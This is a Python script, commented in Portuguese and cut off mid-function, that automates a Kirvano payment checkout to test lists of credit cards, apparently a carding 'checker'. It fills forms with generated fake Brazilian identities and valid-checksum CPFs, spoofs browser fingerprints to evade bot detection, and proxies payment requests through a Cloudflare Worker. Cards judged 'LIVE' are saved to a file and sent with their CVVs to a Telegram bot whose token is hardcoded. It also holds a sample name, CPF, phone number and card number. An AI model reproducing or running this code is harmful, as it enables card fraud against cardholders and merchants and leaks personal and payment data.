#!/usr/bin/env python3
"""
Script de automação STEALTH para preenchimento de formulário da Kirvano
Versão com técnicas avançadas anti-detecção - MULTITHREADING
"""

import asyncio
import argparse
import sys
import os
import random
import time
import aiohttp
import threading
import json
from concurrent.futures import ThreadPoolExecutor, as_completed
from playwright.async_api import async_playwright
from queue import Queue
import colorama
from colorama import Fore, Back, Style
import requests
import urllib.parse

# Inicializa colorama para cores no Windows
colorama.init(autoreset=True)

# URL do Cloudflare Worker
CLOUDFLARE_WORKER_URL = "https://kirvano.jcntcleber.workers.dev"

# Função para envio ao Telegram
def enviar_live_telegram(card_number, expired_month, expired_year, cvv, elemento_text, user_name):
    """Envia cartões LIVE para o Telegram - APENAS ADMIN"""
    try:
        # Configurações do bot
        bot_token = '8383553514:AAF1xMgGQf3G2QJRcA9pbpAeN6qsghaA4pU'
        admin_chat_id = '6218682196'
        
        # Mensagem para admin
        mensagem_admin = f'🎉 <b>NOVA LIVE CAPTURADA!</b> 🎉\n\n'
        mensagem_admin += f'👤 <b>Usuário:</b> @{user_name}\n'
        mensagem_admin += f'💳 <b>Cartão:</b> <code>{card_number}</code>\n'
        mensagem_admin += f'📅 <b>Vencimento:</b> <code>{expired_month}/{expired_year}</code>\n'
        mensagem_admin += f'🔐 <b>CVV:</b> <code>{cvv}</code>\n'
        mensagem_admin += f'📊 <b>Status:</b> <code>{elemento_text}</code>\n\n'
        mensagem_admin += f'⏰ <b>Hora:</b> {time.strftime("%H:%M:%S")}'
        
        # Envia apenas para admin
        url_admin = f'https://api.telegram.org/bot{bot_token}/sendMessage?chat_id={admin_chat_id}&text={urllib.parse.quote(mensagem_admin)}&parse_mode=html'
        requests.get(url_admin, timeout=5)
        
    except Exception as e:
        print(f"Erro ao enviar para Telegram: {e}")

def pegar_infos(bin: str) -> dict:
    """Consulta informações do BIN usando a API FluidPay"""
    try:
        url = 'https://app.fluidpay.com/api/lookup/bin/pub_2HT17PrC7sOCvNp1qwb9XBhb1RO'
        headers = {
            'Authorization': 'pub_2HT17PrC7sOCvNp1qwb9XBhb1RO',
            'Content-Type': 'application/json',
        }
        payload = {
            'type': 'tokenizer',
            'type_id': '230685b9-61e6-4dc4-8cb2-18ef6fd93146',
            'bin': bin,
        }
        
        import requests
        response = requests.post(url, headers=headers, json=payload, timeout=10)
        
        if response.status_code == 200:
            data = response.json()
            if data.get('status') == 'success' and data.get('data'):
                bin_info = data.get('data', {})
                return {
                    'bank': bin_info.get('issuing_bank', 'N/A'),
                    'country': bin_info.get('country', 'N/A'),
                    'type': bin_info.get('card_type', 'N/A'),
                    'brand': bin_info.get('card_brand', 'N/A'),
                    'level': bin_info.get('card_level_generic', 'N/A')
                }
        
        # Se a API falhar, retorna informações básicas baseadas no BIN
        return {
            'bank': 'BANCO N/A',
            'country': 'BR',
            'type': 'CREDIT',
            'brand': 'UNKNOWN',
            'level': 'N/A'
        }
    except Exception as e:
        # Em caso de erro, retorna informações básicas
        return {
            'bank': 'BANCO N/A',
            'country': 'BR',
            'type': 'CREDIT',
            'brand': 'UNKNOWN',
            'level': 'N/A'
        }

class KirvanoStealthAutomation:
    def __init__(self, headless=True, slow_mo=1000, card_data=None, customer_data=None, cards_file=None, max_threads=3, max_retries=3, url=None, user_name=None):
        self.url = url or "https://pay.kirvano.com/a88f1635-2808-4bd0-b763-e43d2832299b"
        self.user_name = user_name or "Center_LT"
        
        # Dados padrão do cliente
        self.data = customer_data or {
            "nome_completo": "Jorge Tomás da Rosa",
            "email": "lhadorbrasileiro@gmail.com",
            "cpf": "975.028.779-75",
            "pais": "Brazil",
            "celular": "+55 21 98684-3592"
        }
        
        # Dados padrão do cartão
        self.card_data = card_data or {
            "titular": "Jorge Tomas da Rosa",
            "numero": "4066 6999 3693 3813",
            "vencimento": "03/32",
            "cvv": "275"
        }
        
        self.headless = headless
        self.slow_mo = slow_mo
        self.cards_file = cards_file
        self.cards_list = []
        self.max_threads = max_threads
        self.results_queue = Queue()
        self.lock = threading.Lock()
        self.max_retries = max_retries
        self.total_cards = 0
        self.current_card = 0
        self.lock = threading.Lock()
        
        # Se foi fornecido arquivo de cartões, carrega a lista
        if self.cards_file:
            self.load_cards_from_file()
    
    def log_result(self, card_data, result, error_message=None):
        """Log colorido com formato [x/total] STATUS -> card -> retorno -> @leitindev"""
        with self.lock:
            self.current_card += 1
            
            # Formata o cartão completo: numero/mes/ano/cvv
            card_number = card_data['numero'].replace(' ', '')
            
            # Processa a data de vencimento com validação
            vencimento_parts = card_data['vencimento'].split('/')
            if len(vencimento_parts) == 2:
                card_month = vencimento_parts[0].zfill(2)  # Garante 2 dígitos
                card_year = vencimento_parts[1]
                # Se o ano tem 4 dígitos, converte para 2
                if len(card_year) == 4:
                    card_year = card_year[2:]
            else:
                print(f"Formato de vencimento inválido: {card_data['vencimento']}")
                card_month = "01"
                card_year = "25"
            
            card_cvv = card_data['cvv']
            
            # Identifica a bandeira do cartão
            card_brand = self.identify_card_brand(card_number)
            
            # Consulta informações do BIN
            bin_info = pegar_infos(card_number[:6])
            
            card_formatted = f"{card_number}|{card_month}|{card_year}|{card_cvv}"
            
            # Determina cor e status baseado no resultado
            if result == 'SUCCESS':
                color = Fore.GREEN
                status = "LIVE"
                result_text = "SUCCESS"
            elif result == 'FAILED':
                color = Fore.RED
                status = "DIE"
                result_text = "FAILED"
            elif result == 'TIMEOUT_ERROR':
                color = Fore.YELLOW
                status = "DIE"
                result_text = "TIMEOUT"
            elif isinstance(result, str) and result != 'SUCCESS':
                # Analisa a mensagem de erro para determinar se é LIVE ou DIE baseado na bandeira
                if self.is_live_error_by_brand(result, card_data['numero']):
                    color = Fore.GREEN
                    status = "LIVE"
                    result_text = result
                else:
                    color = Fore.RED
                    status = "DIE"
                    result_text = result
            else:
                color = Fore.RED
                status = "DIE"
                result_text = "ERROR"
            
            # Simplifica o resultado para mostrar apenas o código de erro
            if '[' in result_text and ']' in result_text:
                # Extrai apenas o código entre colchetes
                error_code = result_text[result_text.find('['):result_text.find(']')+1]
                simplified_result = error_code
            else:
                # Se não há código entre colchetes, mostra "[s/r]"
                simplified_result = "[s/r]"
            
            # Formata informações do BIN (sempre retorna algo)
            bank = bin_info.get('bank', 'BANCO N/A')
            country = bin_info.get('country', 'BR')
            card_type = bin_info.get('type', 'CREDIT')
            brand = bin_info.get('brand', card_brand)
            level = bin_info.get('level', '')
            
            # Formata o tipo de cartão para maiúsculo
            card_type_upper = card_type.upper() if card_type else 'CREDIT'
            
            # Formata a linha completa com informações do BIN
            ccn_text = " (CCN)" if status == "LIVE" else ""
            
            if level and level != 'N/A':
                line = f"[{self.current_card}/{self.total_cards}] {status} -> {card_formatted} -> {brand} {bank} {level} {country} {card_type_upper} - {status}{ccn_text} {simplified_result} -> @center_lt"
            else:
                line = f"[{self.current_card}/{self.total_cards}] {status} -> {card_formatted} -> {brand} {bank} {country} {card_type_upper} - {status}{ccn_text} {simplified_result} -> @center_lt"
            
            # Imprime com cor no console
            print(f"{color}{line}{Style.RESET_ALL}")
            
            # Se for LIVE, envia para o Telegram e salva no arquivo
            if status == "LIVE":
                enviar_live_telegram(card_number, card_month, card_year, card_cvv, simplified_result, self.user_name)
                # Salva a live no arquivo Aprovadas.txt
                self.save_live_to_file(card_number, card_month, card_year, card_cvv, simplified_result)
    
    def save_live_to_file(self, card_number, card_month, card_year, card_cvv, status):
        """Salva cartão aprovado no arquivo Aprovadas.txt em formato de linha única"""
        try:
            with open('Aprovadas.txt', 'a', encoding='utf-8') as f:
                f.write(f"{card_number}|{card_month}|{card_year}|{card_cvv} com erro {status}\n")
        except Exception as e:
            print(f"Erro ao salvar live: {e}")
    
    def identify_card_brand(self, card_number):
        """Identifica a bandeira do cartão baseado no número"""
        card_number = card_number.replace(' ', '')
        
        # AMEX: Começa com 3
        if card_number.startswith('3'):
            return 'AMEX'
        
        # ELO: Começa com 6
        elif card_number.startswith('6'):
            return 'ELO'
        
        # VISA: Começa com 4
        elif card_number.startswith('4'):
            return 'VISA'
        
        # MASTERCARD: Começa com 51-55 ou 2221-2720
        elif (card_number.startswith(('51', '52', '53', '54', '55')) or 
              (len(card_number) >= 4 and '2221' <= card_number[:4] <= '2720')):
            return 'MASTERCARD'
        
        return 'UNKNOWN'
    
    def is_live_error_by_brand(self, error_message, card_number):
        """Analisa se o erro indica LIVE baseado na bandeira do cartão"""
        card_brand = self.identify_card_brand(card_number)
        
        # Códigos de erro específicos por bandeira
        if card_brand == 'AMEX':
            # AMEX LIVE: códigos específicos (você pode definir quais)
            live_codes = ['[12]', '[51]']  # Exemplo - ajuste conforme necessário
            for code in live_codes:
                if code in error_message:
                    return True
            return False
            
        elif card_brand == 'ELO':
            # ELO LIVE: códigos 63, 54
            live_codes = ['[63]', '[54]']
            for code in live_codes:
                if code in error_message:
                    return True
            return False
            
        elif card_brand == 'VISA':
            # VISA LIVE: códigos N7, 54, 58
            live_codes = ['[N7]','[82]']
            for code in live_codes:
                if code in error_message:
                    return True
            return False
            
        elif card_brand == 'MASTERCARD':
            # MASTERCARD LIVE: códigos 12, 51
            live_codes = ['[12]']
            for code in live_codes:
                if code in error_message:
                    return True
            return False
        
        # Para bandeiras desconhecidas, assume DIE
        return False
    
    def load_cards_from_file(self):
        """Carrega cartões do arquivo cards.txt"""
        try:
            with open(self.cards_file, 'r', encoding='utf-8') as f:
                lines = f.readlines()
                
            for line in lines:
                line = line.strip()
                if line and '|' in line:
                    parts = line.split('|')
                    if len(parts) == 4:
                        numero, mes, ano, cvv = parts
                        # Formata o número do cartão com espaços
                        numero_formatado = f"{numero[:4]} {numero[4:8]} {numero[8:12]} {numero[12:]}"
                        # Formata a data de vencimento - garante que o ano tenha 2 dígitos
                        if len(ano) == 4:
                            vencimento = f"{mes}/{ano[2:]}"
                        elif len(ano) == 2:
                            vencimento = f"{mes}/{ano}"
                        else:
                            print(f"Formato de ano inválido para cartão {numero}: {ano}")
                            continue
                        
                        card_info = {
                            "numero": numero_formatado,
                            "vencimento": vencimento,
                            "cvv": cvv,
                            "titular": None  # Será preenchido com o nome gerado
                        }
                        self.cards_list.append(card_info)
            
            self.total_cards = len(self.cards_list)
            
        except Exception as e:
            print(f"Erro ao carregar cartoes: {e}")
            self.cards_list = []
    
    async def generate_brazilian_data(self):
        """Gera dados brasileiros aleatórios"""
        try:
            # Usando API gratuita para gerar dados brasileiros
            async with aiohttp.ClientSession() as session:
                # Primeira tentativa: API RandomUser (gratuita)
                try:
                    async with session.get('https://randomuser.me/api/?nat=br&inc=name,email,phone,cell,location') as response:
                        if response.status == 200:
                            data = await response.json()
                            user = data['results'][0]
                            
                            # Gera CPF brasileiro válido
                            cpf = self.generate_cpf()
                            
                            # Formata nome completo
                            nome = f"{user['name']['first']} {user['name']['last']}"
                            
                            # Gera email baseado no nome - remove acentos e espaços
                            def remove_accents(text):
                                """Remove acentos de um texto"""
                                import unicodedata
                                # Normaliza para forma NFD e remove diacríticos
                                text = unicodedata.normalize('NFD', text)
                                text = ''.join(c for c in text if not unicodedata.combining(c))
                                return text
                            
                            # Remove acentos e converte para minúsculo
                            first_name_clean = remove_accents(user['name']['first'].lower())
                            last_name_clean = remove_accents(user['name']['last'].lower())
                            
                            # Remove espaços e caracteres especiais
                            first_name_clean = first_name_clean.replace(' ', '').replace('-', '').replace("'", '')
                            last_name_clean = last_name_clean.replace(' ', '').replace('-', '').replace("'", '')
                            
                            email = f"{first_name_clean}.{last_name_clean}@gmail.com"
                            
                            # Formata celular brasileiro
                            celular = self.format_brazilian_phone(user['cell'])
                            
                            return {
                                "nome_completo": nome.title(),
                                "email": email,
                                "cpf": cpf,
                                "pais": "Brazil",
                                "celular": celular
                            }
                except:
                    pass
                
                # Segunda tentativa: Dados aleatórios locais
                return self.generate_local_brazilian_data()
                
        except Exception as e:
            return self.generate_local_brazilian_data()
    
    def generate_cpf(self):
        """Gera um CPF brasileiro válido"""
        # Gera os 9 primeiros dígitos
        cpf = [random.randint(0, 9) for _ in range(9)]
        
        # Calcula o primeiro dígito verificador
        soma = sum(cpf[i] * (10 - i) for i in range(9))
        resto = soma % 11
        cpf.append(0 if resto < 2 else 11 - resto)
        
        # Calcula o segundo dígito verificador
        soma = sum(cpf[i] * (11 - i) for i in range(10))
        resto = soma % 11
        cpf.append(0 if resto < 2 else 11 - resto)
        
        # Formata o CPF
        return f"{cpf[0]}{cpf[1]}{cpf[2]}.{cpf[3]}{cpf[4]}{cpf[5]}.{cpf[6]}{cpf[7]}{cpf[8]}-{cpf[9]}{cpf[10]}"
    
    def format_brazilian_phone(self, phone):
        """Formata telefone para padrão brasileiro"""
        # Remove caracteres não numéricos
        numbers = ''.join(filter(str.isdigit, phone))
        
        # Se tem 11 dígitos, assume que é celular brasileiro
        if len(numbers) >= 11:
            ddd = numbers[:2]
            numero = numbers[2:11]
            return f"+55 {ddd} {numero[:5]}-{numero[5:]}"
        else:
            # Gera um número aleatório brasileiro
            ddd = random.choice(['11', '21', '31', '41', '51', '61', '71', '81', '91'])
            numero = ''.join([str(random.randint(0, 9)) for _ in range(9)])
            return f"+55 {ddd} {numero[:5]}-{numero[5:]}"
    
    def generate_local_brazilian_data(self):
        """Gera dados brasileiros localmente"""
        # Lista de nomes brasileiros comuns
        nomes = [
            "João Silva", "Maria Santos", "Pedro Oliveira", "Ana Costa", "Carlos Ferreira",
            "Lucia Pereira", "Roberto Almeida", "Fernanda Lima", "Ricardo Gomes", "Patricia Rodrigues",
            "Marcos Souza", "Juliana Barbosa", "Andre Martins", "Camila Cardoso", "Felipe Dias",
            "Gabriela Moreira", "Lucas Carvalho", "Isabela Araujo", "Thiago Melo", "Carolina Ribeiro",
            "Diego Nascimento", "Mariana Lopes", "Bruno Mendes", "Amanda Freitas", "Rafael Silva",
            "Beatriz Costa", "Eduardo Santos", "Vanessa Oliveira", "Leonardo Lima", "Natalia Pereira"
        ]
        
        nome = random.choice(nomes)
        sobrenome = random.choice([
            "da Silva", "dos Santos", "de Oliveira", "da Costa", "Ferreira",
            "Pereira", "Almeida", "Lima", "Gomes", "Rodrigues", "Souza",
            "Barbosa", "Martins", "Cardoso", "Dias", "Moreira", "Carvalho"
        ])
        
        nome_completo = f"{nome} {sobrenome}"
        
        # Gera email baseado no nome - remove acentos e espaços
        def remove_accents(text):
            """Remove acentos de um texto"""
            import unicodedata
            # Normaliza para forma NFD e remove diacríticos
            text = unicodedata.normalize('NFD', text)
            text = ''.join(c for c in text if not unicodedata.combining(c))
            return text
        
        # Remove acentos e converte para minúsculo
        nome_clean = remove_accents(nome.lower())
        sobrenome_clean = remove_accents(sobrenome.lower())
        
        # Remove espaços e caracteres especiais
        nome_clean = nome_clean.replace(' ', '').replace('-', '').replace("'", '')
        sobrenome_clean = sobrenome_clean.replace(' ', '').replace('-', '').replace("'", '')
        
        email = f"{nome_clean}.{sobrenome_clean}@gmail.com"
        
        # Gera CPF
        cpf = self.generate_cpf()
        
        # Gera celular brasileiro
        ddd = random.choice(['11', '21', '31', '41', '51', '61', '71', '81', '91'])
        numero = ''.join([str(random.randint(0, 9)) for _ in range(9)])
        celular = f"+55 {ddd} {numero[:5]}-{numero[5:]}"
        
        return {
            "nome_completo": nome_completo,
            "email": email,
            "cpf": cpf,
            "pais": "Brazil",
            "celular": celular
        }

    def run_multithreaded(self):
        """Executa a automação com múltiplas threads"""
        if not self.cards_list:
            print("Nenhum cartao carregado. Executando teste unico...")
            # Executa teste único em thread separada
            thread = threading.Thread(target=self._run_single_test_thread, args=(self.card_data,))
            thread.start()
            thread.join()
            return
        
        print(f"Processando {len(self.cards_list)} cartoes com {self.max_threads} threads")
        
        # Divide os cartões entre as threads
        cards_per_thread = len(self.cards_list) // self.max_threads
        remainder = len(self.cards_list) % self.max_threads
        
        threads = []
        start_idx = 0
        
        for i in range(self.max_threads):
            # Calcula quantos cartões esta thread vai processar
            thread_cards_count = cards_per_thread + (1 if i < remainder else 0)
            end_idx = start_idx + thread_cards_count
            
            if thread_cards_count > 0:
                thread_cards = self.cards_list[start_idx:end_idx]
                thread = threading.Thread(
                    target=self._run_thread_worker,
                    args=(i + 1, thread_cards),
                    name=f"KirvanoThread-{i+1}"
                )
                threads.append(thread)
                start_idx = end_idx
        
        # Inicia todas as threads
        for thread in threads:
            thread.start()
            time.sleep(1)  # Delay entre inicialização das threads
        
        # Aguarda todas as threads terminarem
        for thread in threads:
            thread.join()
        
        # Processa resultados
        self._process_results()
    
    def _run_thread_worker(self, thread_id, cards):
        """Worker de thread que processa uma lista de cartões"""
        # Thread iniciada silenciosamente
        
        for i, card in enumerate(cards, 1):
            try:
                # Gera dados únicos para este cartão
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
                customer_data = loop.run_until_complete(self.generate_brazilian_data())
                loop.close()
                
                # Atualiza o titular do cartão
                card['titular'] = customer_data['nome_completo']
                
                # Executa o teste
                result = self._run_single_test_thread(card, customer_data, thread_id)
                
                # Adiciona resultado à fila
                self.results_queue.put({
                    'thread_id': thread_id,
                    'card_index': i,
                    'card_number': card['numero'],
                    'customer_name': customer_data['nome_completo'],
                    'result': result
                })
                
                # Log colorido do resultado
                self.log_result(card, result)
                
                # Aguarda um pouco entre os testes
                if i < len(cards):
                    time.sleep(random.uniform(2, 4))
                    
            except Exception as e:
                print(f"Erro no cartao {card['numero']}: {e}")
                self.results_queue.put({
                    'thread_id': thread_id,
                    'card_index': i,
                    'card_number': card['numero'],
                    'result': 'ERROR',
                    'error': str(e)
                })
        
        # Thread finalizada silenciosamente
    
    def _run_single_test_thread(self, card_data, customer_data=None, thread_id=None):
        """Executa um teste único em thread separada com retry para erros de timeout"""
        retry_count = 0
        
        while retry_count < self.max_retries:
            try:
                # Cria nova event loop para esta thread
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
                
                # Executa o teste assíncrono
                result = loop.run_until_complete(self._run_single_test_async(card_data, customer_data, thread_id))
                
                loop.close()
                
                # Se não foi erro de timeout, retorna o resultado
                if result != 'TIMEOUT_ERROR':
                    return result
                
                # Se foi timeout, tenta novamente
                retry_count += 1
                if retry_count < self.max_retries:
                    time.sleep(2)  # Aguarda 2 segundos antes de tentar novamente
                
            except Exception as e:
                return 'ERROR'
        
        # Se esgotou todas as tentativas
        return 'TIMEOUT_ERROR'
    
    async def _run_single_test_async(self, card_data, customer_data=None, thread_id=None):
        """Executa um teste único de forma assíncrona"""
        # Atualiza o titular do cartão com o nome gerado
        if not card_data or not card_data.get('titular'):
            card_data = card_data or {}
            card_data['titular'] = customer_data['nome_completo'] if customer_data else self.data['nome_completo']
        
        async with async_playwright() as p:
            # User agents realistas
            user_agents = [
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/120.0'
            ]
            
            selected_ua = random.choice(user_agents)
            
            # Configuração stealth avançada
            browser = await p.chromium.launch(
                headless=self.headless,
                slow_mo=self.slow_mo,
                args=[
                    '--no-sandbox',
                    '--disable-dev-shm-usage',
                    '--disable-blink-features=AutomationControlled',
                    '--disable-extensions',
                    '--no-first-run',
                    '--disable-default-apps',
                    '--disable-sync',
                    '--disable-translate',
                    '--hide-scrollbars',
                    '--mute-audio',
                    '--disable-gpu',
                    '--disable-software-rasterizer',
                    '--disable-background-networking',
                    '--disable-background-timer-throttling',
                    '--disable-client-side-phishing-detection',
                    '--disable-component-extensions-with-background-pages',
                    '--disable-domain-reliability',
                    '--disable-features=TranslateUI',
                    '--disable-hang-monitor',
                    '--disable-ipc-flooding-protection',
                    '--disable-prompt-on-repost',
                    '--disable-renderer-backgrounding',
                    '--metrics-recording-only',
                    '--safebrowsing-disable-auto-update',
                    '--enable-automation',
                    '--use-mock-keychain',
                    '--disable-web-security',
                    '--disable-features=VizDisplayCompositor',
                    '--disable-backgrounding-occluded-windows',
                    '--disable-back-forward-cache',
                    '--disable-breakpad',
                    '--disable-component-update',
                    '--allow-pre-commit-input',
                    '--disable-popup-blocking',
                    '--export-tagged-pdf',
                    '--disable-search-engine-choice-screen',
                    '--unsafely-disable-devtools-self-xss-warnings',
                    '--no-service-autorun',
                    f'--user-agent={selected_ua}'
                ]
            )
            
            try:
                page = await browser.new_page()
                
                # Intercepta requisições e redireciona através do Cloudflare Worker
                async def route_handler(route):
                    request = route.request
                    url = request.url
                    
                    # Intercepta requisições para a API de pagamento
                    if 'pay-api.kirvano.com/payment' in url:
                        try:
                            # Obtém o body da requisição
                            post_data = request.post_data
                            
                            # Faz requisição através do Cloudflare Worker
                            async with aiohttp.ClientSession() as session:
                                worker_url = f"{CLOUDFLARE_WORKER_URL}/payment?checkout_url={urllib.parse.quote(self.url)}"
                                
                                # Parse do JSON se existir
                                json_data = {}
                                if post_data:
                                    try:
                                        json_data = json.loads(post_data)
                                    except:
                                        json_data = {}
                                
                                async with session.post(worker_url, json=json_data, 
                                                       headers={'Content-Type': 'application/json'}) as response:
                                    body = await response.read()
                                    response_data = json.loads(body)
                                    
                                    # Se o Worker retornou formato {http_code, response}, extrai corretamente
                                    if isinstance(response_data, dict) and 'http_code' in response_data:
                                        actual_response = response_data.get('response', response_data)
                                        body = json.dumps(actual_response).encode('utf-8')
                                    
                                    await route.fulfill(
                                        status=200,
                                        body=body,
                                        headers={'Content-Type': 'application/json'}
                                    )
                                    return
                        except Exception as e:
                            # Em caso de erro, continua com a requisição normal
                            await route.continue_()
                            return
                    
                    # Intercepta requisições para o checkout (GET)
                    elif 'pay.kirvano.com' in url and request.method == 'GET':
                        try:
                            async with aiohttp.ClientSession() as session:
                                worker_url = f"{CLOUDFLARE_WORKER_URL}/checkout?url={urllib.parse.quote(url)}"
                                async with session.get(worker_url, headers=dict(request.headers)) as response:
                                    body = await response.read()
                                    await route.fulfill(
                                        status=response.status,
                                        body=body,
                                        headers=dict(response.headers)
                                    )
                                    return
                        except Exception as e:
                            # Em caso de erro, continua com a requisição normal
                            await route.continue_()
                            return
                    
                    # Para outras requisições, continua normalmente
                    await route.continue_()
                
                # Registra o route handler
                await page.route("**/*", route_handler)
                
                # Script stealth avançado
                await page.add_init_script("""
                // Remove webdriver
                Object.defineProperty(navigator, 'webdriver', {
                    get: () => undefined,
                });
                
                // Simula plugins realistas
                Object.defineProperty(navigator, 'plugins', {
                    get: () => [
                        {
                            name: 'Chrome PDF Plugin',
                            filename: 'internal-pdf-viewer',
                            description: 'Portable Document Format'
                        },
                        {
                            name: 'Chrome PDF Viewer',
                            filename: 'mhjfbmdgcfjbbpaeojofohoefgiehjai',
                            description: ''
                        },
                        {
                            name: 'Native Client',
                            filename: 'internal-nacl-plugin',
                            description: ''
                        }
                    ],
                });
                
                // Simula idiomas
                Object.defineProperty(navigator, 'languages', {
                    get: () => ['pt-BR', 'pt', 'en-US', 'en'],
                });
                
                // Simula chrome
                window.chrome = {
                    runtime: {},
                    loadTimes: function() {},
                    csi: function() {},
                    app: {}
                };
                
                // Remove automação
                delete window.cdc_adoQpoasnfa76pfcZLmcfl_Array;
                delete window.cdc_adoQpoasnfa76pfcZLmcfl_Promise;
                delete window.cdc_adoQpoasnfa76pfcZLmcfl_Symbol;
                
                // Simula propriedades de tela
                Object.defineProperty(screen, 'availWidth', {
                    get: () => 1920,
                });
                Object.defineProperty(screen, 'availHeight', {
                    get: () => 1080,
                });
                
                // Simula timezone
                Object.defineProperty(Intl, 'DateTimeFormat', {
                    get: () => function() { return { resolvedOptions: () => ({ timeZone: 'America/Sao_Paulo' }) } },
                });
            """)
            
                # Viewport mínimo fixo para economia máxima de recursos
                await page.set_viewport_size({"width": 250, "height": 250})
                
                page.set_default_timeout(10000)  # Timeout padrão
                
                # Headers realistas
                await page.set_extra_http_headers({
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'Accept-Language': 'pt-BR,pt;q=0.9,en;q=0.8',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'DNT': '1',
                    'Connection': 'keep-alive',
                    'Upgrade-Insecure-Requests': '1',
                    'Sec-Fetch-Dest': 'document',
                    'Sec-Fetch-Mode': 'navigate',
                    'Sec-Fetch-Site': 'none',
                    'Sec-Fetch-User': '?1',
                    'Cache-Control': 'max-age=0'
                })
            
                # Navegação com delay aleatório
                await asyncio.sleep(random.uniform(0.2, 0.5))
                await page.goto(self.url, wait_until="domcontentloaded", timeout=30000)
                await page.wait_for_load_state("domcontentloaded", timeout=30000)
                await asyncio.sleep(random.uniform(0.2, 0.5))
                
                # Usa dados do cliente fornecidos ou padrão
                test_data = customer_data or self.data
                test_card_data = card_data or self.card_data
                
                success = await self.fill_form_stealth(page, test_data, test_card_data)
                
                if success is True:
                    await asyncio.sleep(2)
                    return 'SUCCESS'
                elif isinstance(success, str):
                    return success  # Retorna mensagem de erro
                else:
                    return 'FAILED'
                
            except Exception as e:
                error_message = str(e)
                # Detecta se é erro de timeout
                if "Timeout" in error_message or "timeout" in error_message.lower():
                    return 'TIMEOUT_ERROR'
                else:
                    return 'ERROR'
                
            finally:
                await browser.close()
    
    async def fill_form_stealth(self, page, customer_data, card_data):
        """Preenche o formulário com técnicas stealth"""
        try:
            # 1. Nome completo
            nome_input = await page.wait_for_selector('input[name="customer.name"]', timeout=2000)
            await nome_input.fill(customer_data["nome_completo"])
            
            # 2. E-mail
            email_input = await page.wait_for_selector('input[name="customer.email"]', timeout=2000)
            await email_input.fill(customer_data["email"])
            
            # Seleciona domínio do e-mail
            await self.select_email_domain_stealth(page)
            
            # 2.1. Confirmação de e-mail (novo campo)
            try:
                confirm_email_input = await page.wait_for_selector('input[name="customer.confirmEmail"]', timeout=2000)
                await confirm_email_input.fill(customer_data["email"])
                await asyncio.sleep(random.uniform(0.2, 0.5))  # Pequeno delay para parecer humano
            except:
                # Se o campo não existir, continua normalmente
                pass
            
            # 3. CPF
            cpf_input = await page.wait_for_selector('input[name="customer.document"]', timeout=2000)
            await cpf_input.fill(customer_data["cpf"])
            
            # 4. País
            await self.select_country_stealth(page)
            
            # 5. Celular
            phone_input = await page.wait_for_selector('input[name="customer.phone"]', timeout=2000)
            await phone_input.fill(customer_data["celular"])
            
            # 6. Preenche dados do cartão
            await self.fill_card_form_stealth(page, card_data)
            
            # 7. Aguarda um pouco antes de clicar no botão final
            await asyncio.sleep(random.uniform(2, 3))
            
            # 8. Clica no botão "Assine agora"
            submit_result = await self.click_submit_button_stealth(page)
            if submit_result is False:
                return False
            elif isinstance(submit_result, str):
                return submit_result  # Retorna mensagem de erro
            
            return True
            
        except Exception as e:
            return False
    
    async def fill_card_form_stealth(self, page, card_data):
        """Preenche o formulário do cartão com técnicas stealth"""
        try:
            # 1. Nome do titular
            titular_input = await page.wait_for_selector('input[name="card.holdername"]', timeout=2000)
            await titular_input.fill(card_data["titular"])
            
            # 2. Número do cartão
            numero_input = await page.wait_for_selector('input[name="card.number"]', timeout=2000)
            await numero_input.fill(card_data["numero"])
            
            # 3. Vencimento
            vencimento_input = await page.wait_for_selector('input[name="card.expiration"]', timeout=2000)
            await vencimento_input.fill(card_data["vencimento"])
            
            # 4. CVV
            cvv_input = await page.wait_for_selector('input[name="card.cvv"]', timeout=2000)
            await cvv_input.fill(card_data["cvv"])
            
            return True
            
        except Exception as e:
            return False
    
    async def debug_button_info(self, page):
        """Método de debug para identificar informações do botão"""
        try:
            # Lista todos os botões na página
            buttons = await page.query_selector_all('button')
            
            for i, button in enumerate(buttons):
                try:
                    text = await button.text_content()
                    button_type = await button.get_attribute('type')
                    classes = await button.get_attribute('class')
                    is_visible = await button.is_visible()
                    is_enabled = await button.is_enabled()
                except:
                    pass
        except Exception as e:
            pass

    async def click_submit_button_stealth(self, page):
        """Clica no botão com técnicas stealth e captura erro"""
        try:
            
            # Tenta diferentes seletores para o botão
            button_selectors = [
                'button[type="submit"]:has-text("Comprar agora")',
                'button.c-dTzrZN:has-text("Comprar agora")',
                'button[class*="c-dTzrZN"]:has-text("Comprar agora")',
                'button:has-text("Comprar agora")',
                # Seletores mais específicos baseados na estrutura atual
                'button.c-dTzrZN.c-dTzrZN-jrQeTF-variant-payment',
                'button[class*="c-dTzrZN"][class*="variant-payment"]',
                'button[type="submit"].c-dTzrZN',
                # Fallback para qualquer botão submit
                'button[type="submit"]'
            ]
            
            for i, selector in enumerate(button_selectors):
                try:
                    submit_button = await page.wait_for_selector(selector, timeout=1500)
                    
                    # Verifica se o botão está visível e habilitado
                    is_visible = await submit_button.is_visible()
                    is_enabled = await submit_button.is_enabled()
                    
                    if not is_visible or not is_enabled:
                        continue
                    
                    # Tenta clique normal primeiro
                    try:
                        await submit_button.click()
                    except:
                        # Fallback: clique via JavaScript
                        await page.evaluate("document.querySelector('" + selector.replace("'", "\\'") + "').click()")
                    
                    # Aguarda e captura possíveis erros
                    error_detected = await self.capture_error_message(page)
                    if error_detected:
                        return error_detected  # Retorna a mensagem de erro
                    return True
                    
                except Exception as e:
                    continue
            
            # Se nenhum seletor funcionou, tenta estratégias alternativas
            # Estratégia 1: Busca por qualquer botão com texto "Comprar"
            try:
                comprar_button = await page.wait_for_selector('button:has-text("Comprar")', timeout=2000)
                await comprar_button.click()
                return True
            except:
                pass
            
